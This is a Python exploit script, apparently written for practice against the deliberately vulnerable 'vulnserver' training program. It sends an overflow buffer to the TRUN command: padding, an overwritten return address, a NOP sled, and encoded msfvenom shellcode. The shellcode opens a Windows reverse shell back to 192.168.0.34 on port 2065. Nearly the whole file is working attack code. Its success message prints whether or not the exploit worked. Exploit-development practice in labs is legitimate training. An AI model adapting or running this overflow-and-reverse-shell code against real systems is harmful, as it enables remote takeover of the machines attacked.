#!/usr/bin/env python
                                                                                      
import os
import sys
import socket

host = '192.168.0.36'
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.34 LPORT=2065 -e x86/shikata_ga_nai -b "\x00" -f c
payload = ("\xdb\xce\xd9\x74\x24\xf4\xbb\x96\x2b\xdb\x95\x58\x31\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x13\x03\xce\x38\x39\x60\x12\xd6\x3f"
"\x8b\xea\x27\x20\x05\x0f\x16\x60\x71\x44\x09\x50\xf1\x08\xa6"
"\x1b\x57\xb8\x3d\x69\x70\xcf\xf6\xc4\xa6\xfe\x07\x74\x9a\x61"
"\x84\x87\xcf\x41\xb5\x47\x02\x80\xf2\xba\xef\xd0\xab\xb1\x42"
"\xc4\xd8\x8c\x5e\x6f\x92\x01\xe7\x8c\x63\x23\xc6\x03\xff\x7a"
"\xc8\xa2\x2c\xf7\x41\xbc\x31\x32\x1b\x37\x81\xc8\x9a\x91\xdb"
"\x31\x30\xdc\xd3\xc3\x48\x19\xd3\x3b\x3f\x53\x27\xc1\x38\xa0"
"\x55\x1d\xcc\x32\xfd\xd6\x76\x9e\xff\x3b\xe0\x55\xf3\xf0\x66"
"\x31\x10\x06\xaa\x4a\x2c\x83\x4d\x9c\xa4\xd7\x69\x38\xec\x8c"
"\x10\x19\x48\x62\x2c\x79\x33\xdb\x88\xf2\xde\x08\xa1\x59\xb7"
"\xfd\x88\x61\x47\x6a\x9a\x12\x75\x35\x30\xbc\x35\xbe\x9e\x3b"
"\x39\x95\x67\xd3\xc4\x16\x98\xfa\x02\x42\xc8\x94\xa3\xeb\x83"
"\x64\x4b\x3e\x03\x34\xe3\x91\xe4\xe4\x43\x42\x8d\xee\x4b\xbd"
"\xad\x11\x86\xd6\x44\xe8\x41\x19\x30\xf2\xb3\xf1\x43\xf2\xbb"
"\x10\xcd\x14\xd1\x02\x9b\x8f\x4e\xba\x86\x5b\xee\x43\x1d\x26"
"\x30\xcf\x92\xd7\xff\x38\xde\xcb\x68\xc9\x95\xb1\x3f\xd6\x03"
"\xdd\xdc\x45\xc8\x1d\xaa\x75\x47\x4a\xfb\x48\x9e\x1e\x11\xf2"
"\x08\x3c\xe8\x62\x72\x84\x37\x57\x7d\x05\xb5\xe3\x59\x15\x03"
"\xeb\xe5\x41\xdb\xba\xb3\x3f\x9d\x14\x72\xe9\x77\xca\xdc\x7d"
"\x01\x20\xdf\xfb\x0e\x6d\xa9\xe3\xbf\xd8\xec\x1c\x0f\x8d\xf8"
"\x65\x6d\x2d\x06\xbc\x35\x5d\x4d\x9c\x1c\xf6\x08\x75\x1d\x9b"
"\xaa\xa0\x62\xa2\x28\x40\x1b\x51\x30\x21\x1e\x1d\xf6\xda\x52"
"\x0e\x93\xdc\xc1\x2f\xb6")
buf = "A" * 2003 + "\xAF\x11\x50\x62" + '\x90' * 20 + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

refused = s.connect_ex((host, port))

if refused:
    print("========Could not connect to vulnserver!========")
else:
    print("========Sending exploit========")
    s.send("TRUN /.:/"+buf)
    print("========Exploited successfully!========")
    s.close()
